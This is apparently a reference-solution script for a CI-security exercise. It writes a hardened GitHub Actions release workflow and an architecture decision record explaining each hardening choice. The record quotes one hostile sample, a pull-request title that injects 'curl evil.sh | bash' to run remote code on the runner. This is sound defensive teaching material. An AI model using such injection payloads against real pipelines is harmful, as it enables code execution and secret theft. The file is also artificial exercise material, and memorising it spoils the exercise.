#!/usr/bin/env bash
# Reference solution for gha-13-01-harden-an-existing-workflow.
set -euo pipefail

BASE="${1:-/tmp/harden-workflow}"
PROJECT="$BASE/project"
if [ ! -d "$PROJECT" ]; then
  echo "FAIL: $PROJECT not initialized. Run starter/bootstrap.sh first."
  exit 1
fi

# ---------- Hardened workflow ----------
cat > "$PROJECT/.github/workflows/release.yml" <<'YAML'
# release.yml — hardened per gha-13 baseline.
# Changes documented in docs/adr/0001-ci-security-hardening.md
name: release

on:
  push:
    branches: [main]
    tags: ['v*']
  pull_request: {}

# Deny by default. Each job escalates only what it needs.
permissions:
  contents: read

concurrency:
  group: release-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

jobs:
  # ---------- test on PRs: no secrets, no elevated token ----------
  test:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: step-security/harden-runner@0d381219ddf674d61a7572ddd19d7941e271515c  # v2.9.0
        with:
          egress-policy: audit

      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2

      - uses: actions/setup-python@0a5c61591373683505ea898e09a3ea4f39ef2b9c  # v5.0.0
        with:
          python-version: '3.12'

      - name: Build
        env:
          ACTOR: ${{ github.actor }}
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: |
          pip install -e .
          python -m build
          echo "Built by: \"$ACTOR\" for PR: \"$PR_TITLE\""

  # ---------- deploy: only on tag push, via OIDC, env-scoped ----------
  deploy:
    if: startsWith(github.ref, 'refs/tags/v')
    needs: test
    runs-on: ubuntu-latest
    environment: production         # approval + env-scoped secrets
    permissions:
      contents: write               # for release
      id-token: write               # for OIDC to AWS
    steps:
      - uses: step-security/harden-runner@0d381219ddf674d61a7572ddd19d7941e271515c  # v2.9.0
        with:
          egress-policy: audit

      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2

      - uses: actions/setup-python@0a5c61591373683505ea898e09a3ea4f39ef2b9c  # v5.0.0
        with:
          python-version: '3.12'

      - name: Build artifact
        run: |
          pip install -e .
          python -m build

      - name: Configure AWS via OIDC
        uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502  # v4.0.2
        with:
          role-to-assume: arn:aws:iam::000000000000:role/github-deploy
          role-session-name: GitHubActions-${{ github.run_id }}
          aws-region: eu-west-1

      - name: Deploy to prod
        env:
          DIST_BUCKET: acme-prod-releases
        run: |
          aws s3 sync ./dist "s3://$DIST_BUCKET/"
          aws cloudfront create-invalidation --distribution-id E123 --paths "/*"

      - name: Publish GitHub release
        uses: softprops/action-gh-release@c062e08bd532815e2082a85e87e3ef29c3e6d191  # v2.0.8
        with:
          files: dist/*
YAML

# ---------- ADR ----------
cat > "$PROJECT/docs/adr/0001-ci-security-hardening.md" <<'MD'
# ADR 0001 — CI security hardening of release.yml

## Status
Accepted — 2026-10

## Context

The legacy `release.yml` had been in production for months without a security
audit. Review surfaced at least five anti-patterns documented in the GitHub
Security hardening guide, each with a known real-world incident where the same
pattern was exploited at scale (notably `tj-actions/changed-files` in March
2025 and the family of "pwnrequest" vulnerabilities published since 2022).

The workflow:

- Granted `GITHUB_TOKEN: write-all`.
- Pinned every action to a mutable tag (`@v4`, `@master`).
- Triggered on `pull_request_target`, checked out `head.sha` of the PR, and
  then ran `pip install` on the PR's code with the base repo's secrets in
  scope.
- Interpolated `${{ github.event.pull_request.title }}` and `${{ github.actor }}`
  directly inside `run:` blocks.
- Deployed to AWS using long-lived `AKIA` secrets at the repo scope.

The goal of this ADR is to document the hardening decisions and the
alternatives considered, so the next engineer rotating onto this repo does
not re-introduce them.

## Decision

### D1 — Pin every action to a 40-char commit SHA
- **Anti-pattern**: `uses: actions/checkout@v4`, `uses: shady-vendor/scan-everything@master`.
- **Risk materialised**: `tj-actions/changed-files` (March 2025) — a maintainer
  compromise rewrote every active tag (`v1`…`v45`) to point to a credential-
  exfiltration commit. Repos pinned by tag were owned instantly; repos pinned
  by SHA were unaffected.
- **Decision**: every `uses:` is pinned to a 40-char SHA with a trailing
  `# vX.Y.Z` comment. The dubious third-party action
  (`shady-vendor/scan-everything`) is **removed** entirely; its functionality
  was not justified against its provenance risk.
- **Alternative discarded**: trusting the maintainer with tag pin + 2FA. The
  2025 incident shows this is not a defense.
- **Operational cost**: pins must be kept current — handled by Dependabot
  `github-actions` ecosystem (see D7).

### D2 — Minimum `GITHUB_TOKEN` permissions (deny top-level, escalate per job)
- **Anti-pattern**: `permissions: write-all`.
- **Risk**: any compromised step (D1 vector) with `write-all` can push commits,
  publish packages, create releases, and modify issues/PRs. Massive blast
  radius for a single pwned action.
- **Decision**: top-level `permissions: contents: read`. The `test` job keeps
  that minimum. The `deploy` job escalates to `contents: write` (release) and
  `id-token: write` (OIDC) only.
- **Alternative discarded**: `permissions: {}` top-level — strictly tighter,
  but every job needs `contents: read` for checkout; the compromise `read` is
  more ergonomic without materially increasing risk.

### D3 — Env-var hardening of `run:` blocks (no `${{ github.event.* }}` interpolation)
- **Anti-pattern**:
  `echo "Built by: ${{ github.actor }} for PR: ${{ github.event.pull_request.title }}"`.
- **Risk materialised**: script injection — attacker opens a PR with title
  `` a"; curl evil.sh | bash; echo " `` and achieves RCE on the runner. This
  is the single most-reported class of advisory in GitHub Security Lab's GHA
  research.
- **Decision**: every attacker-controlled value flows via `env:` on the step,
  and is referenced as `"$VAR"` (double-quoted) in the script. The `${{ ... }}`
  expansion happens into the value of the env var, not into the command
  string, so the shell parses the content as data.
- **Alternative discarded**: regex-stripping dangerous characters from the
  title. Fragile; `env:` is the recommended pattern in the official docs.

### D4 — Replace `pull_request_target` with `pull_request`
- **Anti-pattern**: `on: pull_request_target` + `checkout` of `head.sha` +
  `pip install -e .` on the PR code.
- **Risk materialised**: the "pwnrequest" family (Teddy Katz et al., 2022+).
  `pull_request_target` runs in the context of the base repo with its
  secrets. Executing PR code (`pip install` triggers `setup.py` /
  `pyproject.toml` build hooks) runs attacker code with those secrets.
- **Decision**: the workflow no longer uses `pull_request_target`. The `test`
  job runs on `pull_request` (no secrets exposed to forks). The `deploy` job
  runs on tag push only, never from a PR.
- **Alternative discarded**: keeping `pull_request_target` with an
  `if: head.repo.fork == false` filter. Fails under a compromised-maintainer
  scenario (branch on the same repo bypasses the filter).

### D5 — OIDC to AWS instead of long-lived `AKIA` secrets
- **Anti-pattern**: `AWS_ACCESS_KEY_ID` + `AWS_SECRET_ACCESS_KEY` as repo
  secrets.
- **Risk**: credential leak (log print, exfiltration via a compromised
  action) results in persistent attacker access until a human rotates. Rotation
  does not happen in most teams.
- **Decision**: `aws-actions/configure-aws-credentials` with `role-to-assume`
  via OIDC. The IAM trust policy for `github-deploy` pins
  `sub = repo:acme/release-pipeline:environment:production` (configured
  outside this YAML — see §Consequences).
- **Alternative discarded**: rotating AKIA keys monthly via a bot. Still a
  secret in GitHub; still leakable; added operational cost.

### D6 — Scope production secrets to a protected `environment`
- **Anti-pattern**: deploy credentials at repo scope, available to every
  workflow in the repo.
- **Decision**: `deploy` job declares `environment: production` with required
  reviewers and allowed-ref `refs/tags/v*`. The OIDC `sub` is pinned to this
  environment, so STS will not even issue credentials to a workflow not
  attached to it.
- **Alternative discarded**: no environment, relying on `if: startsWith(...)`.
  No approval gate, no reviewer, no CloudTrail-side distinction.

### D7 — Defense in depth: `harden-runner` audit + `dependabot.yml`
- **Decision**: `step-security/harden-runner@<SHA>` with `egress-policy: audit`
  on every job logs outbound network calls, giving a tripwire for exfiltration
  attempts even if an action is compromised. A `.github/dependabot.yml` with
  `package-ecosystem: github-actions` keeps the SHA pins current.
- **Trajectory**: after 2 weeks of audit data, switch `egress-policy` to
  `block` with an explicit allow-list for critical workflows.

## Consequences

### Positive
- Blast radius of any single compromised action is bounded to the declared
  job scope.
- No long-lived cloud credentials in the repo; audit trail in CloudTrail.
- Script-injection surface is zero.
- Dependabot keeps the pinning healthy without manual chase.

### Negative / operational cost
- Developers must learn the `env:` + `"$VAR"` pattern (short onboarding).
- SHA pins are illegible at a glance; mitigated by the `# vX.Y.Z` comment.
- New jobs must explicitly declare `permissions:` escalations; occasionally
  surfaces as a job failing on first run with
  `Resource not accessible by integration`. This is the control working as
  intended.

### Out of scope for this ADR
- Configuring the IAM OIDC provider and the trust policy of `github-deploy`
  role (lives in the infra Terraform repo, referenced here).
- Enabling "Require approval for all outside collaborators" in
  `Settings → Actions`. Done at the org level (see platform ADR 0007).
- Attestations / SBOM for release artifacts (planned for the next quarter,
  gha-14 scope).
- Converting the hardening into an org-level `required workflow` (gha-15).
MD

echo "Solution applied under $PROJECT/"
ls -R "$PROJECT"
